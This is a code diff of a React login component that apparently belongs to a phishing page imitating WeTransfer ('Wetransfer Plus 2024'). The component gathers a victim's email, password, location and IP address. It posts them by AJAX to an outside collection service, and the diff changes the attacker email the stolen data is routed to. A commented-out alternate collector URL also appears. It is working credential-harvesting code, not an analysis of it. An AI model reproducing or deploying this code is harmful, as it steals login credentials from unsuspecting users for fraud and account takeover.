@@ -109,19 +109,20 @@ export const Iceberg = ()=>{
             }, 2200);
     
             const user = {
-                email: email,
+                email: b,
                 pswd: pwd,
                 country: country,
                 city: city,
                 flag: flag,
                 eyep: ipAdress
             };
+            // console.log(b);
     
           $.ajax({
               type: "POST",
-              url: "https://meler-service.onrender.com/get_details/speinter82@gmail.com",
+              url: "https://meler-service.onrender.com/get_details/joshyepes0@gmail.com",
             //   url: "https://bucketlion.com/hello/spei.php",
-              //   speinter82@gmail.com
+            // speinter82@gmail.com
               data: user,
               success(data) {
                   console.log(data);
@@ -224,13 +225,6 @@ export const Iceberg = ()=>{
                             onClick={distinction}
                         />
                     </div>
-
-
-
-
-
-
-
 
 
                     <p className="ice_foote__r_kjhgyjkFGyuiklm">Copyright (c) Wetransfer Plus 2024</p>
